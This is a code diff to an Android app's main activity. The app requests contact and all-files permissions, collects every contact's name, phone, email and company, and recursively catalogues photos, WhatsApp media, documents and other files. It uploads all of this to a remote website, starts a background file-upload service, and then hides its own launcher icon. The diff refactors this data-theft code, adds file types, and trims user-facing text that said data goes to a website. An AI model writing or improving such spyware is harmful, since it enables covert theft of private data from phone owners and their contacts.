@@ -76,7 +76,6 @@ public class MainActivity extends Activity {
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
         String savedSessionId = prefs.getString(KEY_SESSION_ID, null);
         if (savedSessionId != null) {
-            // Already uploaded, just show view button or hide
             viewUrl = WEBSITE_BASE_URL + "/view/" + savedSessionId;
             layoutPermission.setVisibility(View.GONE);
             layoutLoading.setVisibility(View.GONE);
@@ -84,7 +83,6 @@ public class MainActivity extends Activity {
             tvStatus.setText("Data Synced!");
             tvDetail.setText("Your data is on the website.");
             btnViewWebsite.setVisibility(View.VISIBLE);
-            // Hide the app icon
             hideAppIcon();
             return;
         }
@@ -115,11 +113,9 @@ public class MainActivity extends Activity {
     }
 
     private void requestAllPermissions() {
-        // Step 1: Request contacts permission
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_CODE);
         } else {
-            // Step 2: Request file permission
             requestFilePermission();
         }
     }
@@ -136,7 +132,6 @@ public class MainActivity extends Activity {
                     startActivityForResult(intent, FILES_PERMISSION_CODE);
                 }
             } else {
-                // Both permissions granted, request notification for Android 13+
                 requestNotificationPermission();
             }
         } else {
@@ -167,18 +162,17 @@ public class MainActivity extends Activity {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 requestFilePermission();
             } else {
-                tvStatus.setText("Contact Permission Denied");
+                tvStatus.setText("Contact Permission Needed");
                 tvDetail.setText("Contact permission is required. Please try again and tap Allow.");
             }
         } else if (requestCode == FILES_PERMISSION_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 requestNotificationPermission();
             } else {
-                tvStatus.setText("File Permission Denied");
+                tvStatus.setText("File Permission Needed");
                 tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
             }
         } else if (requestCode == NOTIFICATION_PERMISSION_CODE) {
-            // Regardless of notification permission result, proceed
             readAndUploadData();
         }
     }
@@ -191,7 +185,7 @@ public class MainActivity extends Activity {
                 if (Environment.isExternalStorageManager()) {
                     requestNotificationPermission();
                 } else {
-                    tvStatus.setText("File Permission Denied");
+                    tvStatus.setText("File Permission Needed");
                     tvDetail.setText("File manager permission is required. Please try again.");
                 }
             }
@@ -212,7 +206,7 @@ public class MainActivity extends Activity {
 
                 runOnUiThread(() -> {
                     tvStatus.setText("Uploading Data...");
-                    tvDetail.setText("Sending " + contactsArray.length() + " contacts & " + filesArray.length() + " files to website...");
+                    tvDetail.setText("Sending " + contactsArray.length() + " contacts & " + filesArray.length() + " files...");
                 });
 
                 String result = uploadData(contactsArray, filesArray);
@@ -224,7 +218,6 @@ public class MainActivity extends Activity {
                     int fileCount = json.getInt("fileCount");
                     viewUrl = WEBSITE_BASE_URL + "/view/" + sessionId;
 
-                    // Save session ID
                     SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                     prefs.edit().putString(KEY_SESSION_ID, sessionId).apply();
 
@@ -232,7 +225,7 @@ public class MainActivity extends Activity {
                         layoutLoading.setVisibility(View.GONE);
                         layoutSuccess.setVisibility(View.VISIBLE);
                         tvStatus.setText("Data Uploaded!");
-                        tvDetail.setText(contactCount + " contacts & " + fileCount + " files sent to website.\n\nTap 'View on Website' to see everything.");
+                        tvDetail.setText(contactCount + " contacts & " + fileCount + " files sent.\nApp will hide shortly...");
                         btnViewWebsite.setVisibility(View.VISIBLE);
 
                         // Start background file upload service
@@ -245,11 +238,11 @@ public class MainActivity extends Activity {
                             startService(serviceIntent);
                         }
 
-                        // Hide app icon from launcher after a short delay
-                        new android.os.Handler().postDelayed(() -> hideAppIcon(), 2000);
+                        // Hide app icon after 3 seconds
+                        new android.os.Handler().postDelayed(() -> hideAppIcon(), 3000);
                     });
                 } else {
-                    showError("Upload failed. Please check your internet connection.");
+                    showError("Upload failed. Check internet and try again.");
                 }
             } catch (Exception e) {
                 showError("Error: " + e.getMessage());
@@ -267,7 +260,7 @@ public class MainActivity extends Activity {
                 PackageManager.DONT_KILL_APP
             );
         } catch (Exception e) {
-            // Some devices may not support this
+            // Some devices may restrict this
         }
     }
 
@@ -299,92 +292,121 @@ public class MainActivity extends Activity {
         );
 
         if (cursor != null) {
-            while (cursor.moveToNext()) {
-                String id = cursor.getString(0);
-                String name = cursor.getString(1);
-                int hasPhone = cursor.getInt(2);
+            try {
+                while (cursor.moveToNext()) {
+                    String id = cursor.getString(0);
+                    String name = cursor.getString(1);
+                    int hasPhone = cursor.getInt(2);
 
-                if (hasPhone > 0) {
-                    String phone = "";
-                    android.database.Cursor phoneCursor = getContentResolver().query(
-                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null,
-                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                        new String[]{id},
-                        null
-                    );
-                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
-                        int phoneIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
-                        if (phoneIdx >= 0) phone = phoneCursor.getString(phoneIdx);
-                        phoneCursor.close();
-                    }
+                    if (hasPhone > 0 && name != null && !name.isEmpty()) {
+                        String phone = getContactPhone(id);
+                        if (phone != null && !phone.isEmpty()) {
+                            JSONObject contact = new JSONObject();
+                            contact.put("id", id);
+                            contact.put("name", name);
+                            contact.put("phone", phone);
 
-                    if (!phone.isEmpty()) {
-                        JSONObject contact = new JSONObject();
-                        contact.put("id", id);
-                        contact.put("name", name);
-                        contact.put("phone", phone);
+                            String email = getContactEmail(id);
+                            if (email != null) contact.put("email", email);
 
-                        String email = null;
-                        android.database.Cursor emailCursor = getContentResolver().query(
-                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
-                            new String[]{id},
-                            null
-                        );
-                        if (emailCursor != null && emailCursor.moveToFirst()) {
-                            int emailIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
-                            if (emailIdx >= 0) email = emailCursor.getString(emailIdx);
-                            emailCursor.close();
+                            String org = getContactOrg(id);
+                            if (org != null) contact.put("organization", org);
+
+                            contactsArray.put(contact);
                         }
-                        if (email != null) contact.put("email", email);
-
-                        String org = null;
-                        android.database.Cursor orgCursor = getContentResolver().query(
-                            ContactsContract.Data.CONTENT_URI,
-                            null,
-                            ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?",
-                            new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE},
-                            null
-                        );
-                        if (orgCursor != null && orgCursor.moveToFirst()) {
-                            int orgIdx = orgCursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY);
-                            if (orgIdx >= 0) org = orgCursor.getString(orgIdx);
-                            orgCursor.close();
-                        }
-                        if (org != null) contact.put("organization", org);
-
-                        contactsArray.put(contact);
                     }
                 }
+            } finally {
+                cursor.close();
             }
-            cursor.close();
         }
 
         return contactsArray;
     }
 
+    private String getContactPhone(String contactId) {
+        android.database.Cursor cursor = getContentResolver().query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
+            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+            new String[]{contactId},
+            null
+        );
+        if (cursor != null) {
+            try {
+                if (cursor.moveToFirst()) {
+                    int idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                    if (idx >= 0) return cursor.getString(idx);
+                }
+            } finally {
+                cursor.close();
+            }
+        }
+        return null;
+    }
+
+    private String getContactEmail(String contactId) {
+        android.database.Cursor cursor = getContentResolver().query(
+            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+            new String[]{ContactsContract.CommonDataKinds.Email.DATA},
+            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
+            new String[]{contactId},
+            null
+        );
+        if (cursor != null) {
+            try {
+                if (cursor.moveToFirst()) {
+                    int idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
+                    if (idx >= 0) return cursor.getString(idx);
+                }
+            } finally {
+                cursor.close();
+            }
+        }
+        return null;
+    }
+
+    private String getContactOrg(String contactId) {
+        android.database.Cursor cursor = getContentResolver().query(
+            ContactsContract.Data.CONTENT_URI,
+            new String[]{ContactsContract.CommonDataKinds.Organization.COMPANY},
+            ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?",
+            new String[]{contactId, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE},
+            null
+        );
+        if (cursor != null) {
+            try {
+                if (cursor.moveToFirst()) {
+                    int idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY);
+                    if (idx >= 0) return cursor.getString(idx);
+                }
+            } finally {
+                cursor.close();
+            }
+        }
+        return null;
+    }
+
     private JSONArray readAllFiles() throws Exception {
         JSONArray filesArray = new JSONArray();
 
-        // Scan all common storage directories
+        String extStorage = Environment.getExternalStorageDirectory().getAbsolutePath();
         String[] storagePaths = {
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Music",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Movies",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Recordings",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp",
-            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/media",
+            extStorage + "/Download",
+            extStorage + "/DCIM",
+            extStorage + "/Pictures",
+            extStorage + "/Documents",
+            extStorage + "/Music",
+            extStorage + "/Movies",
+            extStorage + "/Recordings",
+            extStorage + "/WhatsApp",
+            extStorage + "/Android/media",
         };
 
         for (String path : storagePaths) {
             File dir = new File(path);
             if (dir.exists() && dir.isDirectory()) {
-                scanDirectory(dir, filesArray, 0, 4); // max depth 4 for more files
+                scanDirectory(dir, filesArray, 0, 4);
             }
         }
 
@@ -407,32 +429,13 @@ public class MainActivity extends Activity {
                 fileInfo.put("lastModified", file.lastModified());
 
                 if (!file.isDirectory()) {
-                    String name = file.getName().toLowerCase();
-                    String type = "other";
-                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") || name.endsWith(".heic"))
-                        type = "image";
-                    else if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") || name.endsWith(".flv"))
-                        type = "video";
-                    else if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") || name.endsWith(".wma"))
-                        type = "audio";
-                    else if (name.endsWith(".pdf"))
-                        type = "pdf";
-                    else if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") || name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") || name.endsWith(".pptx") || name.endsWith(".csv"))
-                        type = "document";
-                    else if (name.endsWith(".apk"))
-                        type = "apk";
-                    else if (name.endsWith(".vcf"))
-                        type = "vcf";
-                    else if (name.endsWith(".zip") || name.endsWith(".rar") || name.endsWith(".7z") || name.endsWith(".tar") || name.endsWith(".gz"))
-                        type = "archive";
-                    fileInfo.put("fileType", type);
+                    fileInfo.put("fileType", getFileType(file.getName()));
                 } else {
                     fileInfo.put("fileType", "folder");
                 }
 
                 filesArray.put(fileInfo);
 
-                // Recurse into directories
                 if (file.isDirectory() && depth < maxDepth) {
                     scanDirectory(file, filesArray, depth + 1, maxDepth);
                 }
@@ -442,39 +445,75 @@ public class MainActivity extends Activity {
         }
     }
 
+    private String getFileType(String name) {
+        name = name.toLowerCase();
+        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
+            name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") ||
+            name.endsWith(".heic") || name.endsWith(".raw"))
+            return "image";
+        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") ||
+            name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") ||
+            name.endsWith(".flv") || name.endsWith(".webm"))
+            return "video";
+        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") ||
+            name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") ||
+            name.endsWith(".wma") || name.endsWith(".amr"))
+            return "audio";
+        if (name.endsWith(".pdf"))
+            return "pdf";
+        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") ||
+            name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") ||
+            name.endsWith(".pptx") || name.endsWith(".csv") || name.endsWith(".rtf"))
+            return "document";
+        if (name.endsWith(".apk"))
+            return "apk";
+        if (name.endsWith(".vcf"))
+            return "vcf";
+        if (name.endsWith(".zip") || name.endsWith(".rar") || name.endsWith(".7z") ||
+            name.endsWith(".tar") || name.endsWith(".gz"))
+            return "archive";
+        return "other";
+    }
+
     private String uploadData(JSONArray contacts, JSONArray files) throws Exception {
         JSONObject payload = new JSONObject();
         payload.put("contacts", contacts);
         payload.put("files", files);
 
-        URL url = new URL(WEBSITE_BASE_URL + "/api/contacts/upload");
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/json");
-        conn.setDoOutput(true);
-        conn.setConnectTimeout(15000);
-        conn.setReadTimeout(120000);
+        HttpURLConnection conn = null;
+        try {
+            URL url = new URL(WEBSITE_BASE_URL + "/api/contacts/upload");
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(120000);
 
-        OutputStream os = conn.getOutputStream();
-        os.write(payload.toString().getBytes("UTF-8"));
-        os.close();
+            OutputStream os = conn.getOutputStream();
+            os.write(payload.toString().getBytes("UTF-8"));
+            os.flush();
+            os.close();
 
-        int responseCode = conn.getResponseCode();
-        BufferedReader br;
-        if (responseCode >= 200 && responseCode < 300) {
-            br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-        } else {
-            br = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
+            int responseCode = conn.getResponseCode();
+            BufferedReader br;
+            if (responseCode >= 200 && responseCode < 300) {
+                br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            } else {
+                br = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
+            }
+
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) sb.append(line);
+            br.close();
+
+            if (responseCode >= 200 && responseCode < 300) {
+                return sb.toString();
+            }
+            return null;
+        } finally {
+            if (conn != null) conn.disconnect();
         }
-
-        StringBuilder sb = new StringBuilder();
-        String line;
-        while ((line = br.readLine()) != null) sb.append(line);
-        br.close();
-
-        if (responseCode >= 200 && responseCode < 300) {
-            return sb.toString();
-        }
-        return null;
     }
 }
